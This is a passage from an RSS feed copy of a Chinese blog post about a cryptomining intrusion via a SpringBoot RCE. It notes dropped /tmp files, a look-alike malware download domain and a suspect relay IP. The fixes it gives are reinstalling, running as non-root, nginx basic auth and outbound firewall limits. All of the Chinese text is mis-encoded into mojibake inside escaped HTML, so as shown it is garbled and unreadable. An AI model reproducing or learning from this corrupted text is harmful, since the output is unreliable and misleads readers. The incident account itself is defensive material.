´æ—¥å¿—&lt;/figcaption&gt;&lt;/figure&gt;&lt;h3&gt;å…¶ä»–ä¿¡æ¯&lt;/h3&gt;&lt;p&gt;é™¤äº†ä¸Šè¿°æ–‡ä»¶ï¼Œ&lt;code&gt;/tmp&lt;/code&gt;æ–‡ä»¶å¤¹ä¸‹è¿˜ç”Ÿæˆäº†.1å’Œ.1.shæ–‡ä»¶ï¼›&lt;/p&gt;&lt;p&gt;æŸ¥è¯¢å¯ç–‘ipï¼Œä½äºå›½å†…åŒ—äº¬å¸‚ï¼Œåº”è¯¥æ˜¯è‚‰é¸¡ï¼›&lt;/p&gt;&lt;p&gt;æŸ¥è¯¢æœ¨é©¬ä¸‹è½½åŸŸåwindowsupdatesupport.orgï¼Œä»Šå¹´6æœˆæ³¨å†Œï¼Œè§£æipéƒ½åœ¨å›½å¤–ã€‚è¯¥åŸŸåå¾ˆæœ‰æ··æ·†æ€§ï¼Œå¹¶ä¸”ä¸ºäº†æ–¹ä¾¿ç›´æ¥ç”¨httpè®¿é—®ï¼›&lt;/p&gt;&lt;p&gt;é™¤äº†ä¸‹è½½æœ¨é©¬æ–‡ä»¶æŒ–çŸ¿ï¼Œæœªæ”¹å˜æœåŠ¡å™¨ä¸Šçš„å…¶ä»–æ•°æ®ã€‚&lt;br/&gt; &lt;span id=&quot;bnp_i_2&quot;/&gt;&lt;/p&gt;&lt;h2&gt;æœåŠ¡å™¨è¢«å…¥ä¾µæŒ–çŸ¿è§£å†³åŠæ³•&lt;/h2&gt;&lt;p&gt;è™½ç„¶çŸ¥é“æ˜¯SpringBootåº”ç”¨è§¦å‘äº†RCEï¼Œä½†é—æ†¾ç›®å‰ä»æœªæ‰¾åˆ°æ˜¯å“ªä¸ªåŒ…å¯¼è‡´çš„æ¼æ´ã€‚ç›®å‰é‡‡å–çš„ç¼“è§£æªæ–½ä¸ºï¼š&lt;/p&gt;&lt;p&gt;1. è¢«å…¥ä¾µæœåŠ¡å™¨é‡è£…ç³»ç»Ÿï¼›&lt;/p&gt;&lt;p&gt;2. ä½¿ç”¨érootç”¨æˆ·å¯åŠ¨SpringBootåº”ç”¨ï¼›&lt;/p&gt;&lt;p&gt;3. è¢«å…¥ä¾µçš„æ˜¯å­ç³»ç»Ÿï¼Œå¢åŠ åŸºæœ¬æˆæƒï¼š&lt;/p&gt;&lt;pre&gt;apt install -y apache2-utils
htpasswd /etc/nginx/conf.d/.htpasswd user&lt;/pre&gt;&lt;p&gt;ç„¶åé…ç½®Nginxä½¿ç”¨è®¤è¯ä¿¡æ¯ï¼š&lt;/p&gt;&lt;pre&gt;server {
  ...
  auth_basic  &quot;å­ç³»ç»Ÿé‰´æƒï¼š&quot;;
  auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
  ..
}&lt;/pre&gt;&lt;p&gt;4. é˜²ç«å¢™é™åˆ¶å¯¹å¤–è¿æ¥ã€‚&lt;/p&gt;&lt;p&gt;ä¸Šè¿°é”™è¯¯èƒ½ä¸€å®šç¨‹åº¦ä¸Šé¿å…ç±»ä¼¼æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œä½†æ‰¾åˆ°åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´æ‰æ˜¯æ¥ä¸‹æ¥çš„é‡ç‚¹ã€‚&lt;br/&gt; &lt;span id=&quot;bnp_i_3&quot;/&gt;&lt;/p&gt;&lt;h2&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;å¹¸è¿çš„æ˜¯è¿™æ¬¡æ¥çš„æ˜¯æŒ–çŸ¿æœ¨é©¬ï¼ŒæœåŠ¡å™¨ä¸Šçš„ç¨‹åºå’Œæ•°æ®éƒ½æœªå—å½±å“ã€‚ä¹Ÿå¾ˆæ„Ÿè°¢&lt;a href=&quot;https://www.aliyun.com/minisite/goods?userCode=k4evdv8n&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;é˜¿é‡Œäº‘&lt;/a&gt;å…è´¹çš„å®‰å…¨æé†’ï¼Œè®©æˆ‘åœ¨ç¬¬ä¸€æ—¶é—´å¤„ç†ã€‚&lt;/p&gt;&lt;p&gt;ä½†è¿™æ¬¡äº‹æ•…ä¹Ÿæ•²é†’äº†è­¦é’Ÿï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ä¸è¦éšæ„ç”¨rootæƒé™è¿è¡Œç¨‹åºï¼›&lt;/li&gt;&lt;li&gt;é˜²ç«å¢™æƒé™è¦ä¸¥æ ¼æ”¶ç´§ï¼›&lt;/li&gt;&lt;li&gt;åšå¥½å®‰å…¨ç›‘æ§ï¼›&lt;/li&gt;&lt;li&gt;æ—¶åˆ»åšå¥½æ•°æ®å¤‡ä»½ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span id=&quot;bnp_i_4&quot;/&gt;&lt;/p&gt;&lt;h2&gt;å‚è€ƒ&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://docs.nginx.com/nginx/admin-guide/security-controls/configuring-http-basic-authentication/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Restricting Access with HTTP Basic Authentication&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/u013467442/article/details/88937381&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;è®°å½•ä¸€æ¬¡è§£å†³kworkerdsæŒ–çŸ¿æœ¨é©¬çš„è¿‡ç¨‹&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/site-recent-security-events/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æœ¬ç«™è¿‘æœŸå‘ç”Ÿçš„å‡ èµ·å®‰å…¨äº‹æ•…&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-protect-cc-attack/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æœåŠ¡å™¨ç®€æ˜“é˜²CCæ”»å‡»è®¾ç½®&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/do-hide-site-real-ip/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;åšä¸€ä¸ªæ°¸ä¸æš´éœ²çœŸå®IPçš„ç½‘ç«™&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Â &lt;/p&gt;&lt;p class=&quot;clear&quot;/&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
</channel></rss>